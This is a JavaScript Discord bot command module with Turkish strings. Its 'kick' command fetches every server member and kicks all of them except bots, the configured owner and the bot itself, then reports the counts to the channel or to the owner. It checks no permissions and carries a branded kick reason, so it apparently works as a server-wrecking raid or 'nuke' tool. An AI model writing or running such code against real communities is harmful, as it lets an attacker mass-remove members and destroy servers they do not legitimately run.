const config = require("../config.json");

module.exports = {
  name: "kick",
  description: "Sunucudaki tüm üyeleri at",
  async execute(message, args, client) {
    if (!message.guild) {
      return message.reply(" Bu komut sadece sunucu içinde kullanılabilir!");
    }

    const hedefSunucu = message.guild;

    try {
      await message.react("👢"); // burada komutu kullandığınız zaman Belirlediğiniz emoji ile mesajınıza tepki ekler ben burada 👢 emojisini kullandım
      await hedefSunucu.members.fetch();
      const uyeler = hedefSunucu.members.cache;

      let atilanSayisi = 0;
      let atlanSayisi = 0;

      console.log(
        `👢 ${hedefSunucu.name} sunucusunda üyeleri atmaya başlıyor...`
      );

      for (const [id, uye] of uyeler) {
        if (
          !uye.user.bot &&
          uye.id !== config.ownerId &&
          uye.id !== client.user.id
        ) {
          try {
            await uye.kick("botoria");
            atilanSayisi++;
            console.log(`Üye atıldı: ${uye.user.tag}`);
          } catch (error) {
            atlanSayisi++;
            console.log(`⚠️ Üye atılamadı: ${uye.user.tag}`);
          }
        }
      }

      const cevap = ` Atma işlemi tamamlandı!\n Atılan: ${atilanSayisi}\n⚠️ Atlanan: ${atlanSayisi}`;

      try {
        message.channel.send(cevap);
      } catch (error) {
        const sahip = await client.users.fetch(config.ownerId);
        sahip.send(`${cevap}\nSunucu: ${hedefSunucu.name}`);
      }
    } catch (error) {
      console.error("Kick komutunda hata:", error);
      message.reply("Kick komutu çalıştırılırken bir hata oluştu.");
    }
  },
};
